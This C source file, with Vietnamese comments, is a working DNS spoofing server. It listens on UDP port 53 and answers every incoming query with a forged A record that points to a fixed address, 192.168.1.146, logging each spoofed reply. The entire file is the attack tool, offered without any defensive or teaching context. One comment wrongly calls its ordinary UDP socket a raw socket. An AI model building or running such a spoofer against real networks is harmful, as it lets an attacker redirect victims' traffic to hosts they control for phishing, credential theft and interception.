#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>

#define PORT 53
#define BUFFER_SIZE 1024
#define FAKE_IP "192.168.1.146"

// Hàm tạo DNS response giả mạo
void create_dns_response(char *buffer, int *packet_len, char *query, int query_len) {
    // DNS header
    *(uint16_t *)(buffer) = *(uint16_t *)(query); // Transaction ID
    *(uint16_t *)(buffer + 2) = htons(0x8180); // Flags: Standard query response, no error
    *(uint16_t *)(buffer + 4) = htons(1); // Questions
    *(uint16_t *)(buffer + 6) = htons(1); // Answer RRs
    *(uint16_t *)(buffer + 8) = htons(0); // Authority RRs
    *(uint16_t *)(buffer + 10) = htons(0); // Additional RRs

    // Copy DNS query
    memcpy(buffer + 12, query + 12, query_len - 12);

    // DNS answer
    *(uint16_t *)(buffer + query_len) = htons(0xC00C); // Pointer to domain name
    *(uint16_t *)(buffer + query_len + 2) = htons(0x0001); // Type A
    *(uint16_t *)(buffer + query_len + 4) = htons(0x0001); // Class IN
    *(uint32_t *)(buffer + query_len + 6) = htonl(60); // TTL
    *(uint16_t *)(buffer + query_len + 10) = htons(4); // Data length
    *(uint32_t *)(buffer + query_len + 12) = inet_addr(FAKE_IP); // Spoofed IP address

    *packet_len = query_len + 16;
}

int main() {
    int sockfd;
    char buffer[BUFFER_SIZE];
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);

    // Tạo raw socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("socket");
        exit(1);
    }

    // Cấu hình địa chỉ server
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind socket
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        close(sockfd);
        exit(1);
    }

    printf("[*] DNS Spoofing server is running...\n");

    while (1) {
        // Nhận truy vấn DNS
        int recv_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&client_addr, &client_len);
        if (recv_len < 0) {
            perror("recvfrom");
            continue;
        }

        // Tạo DNS response giả mạo
        int response_len;
        create_dns_response(buffer, &response_len, buffer, recv_len);

        // Gửi DNS response giả mạo
        if (sendto(sockfd, buffer, response_len, 0, (struct sockaddr *)&client_addr, client_len) < 0) {
            perror("sendto");
            continue;
        }

        printf("[+] Sent spoofed DNS response to %s\n", inet_ntoa(client_addr.sin_addr));
    }

    close(sockfd);
    return 0;
}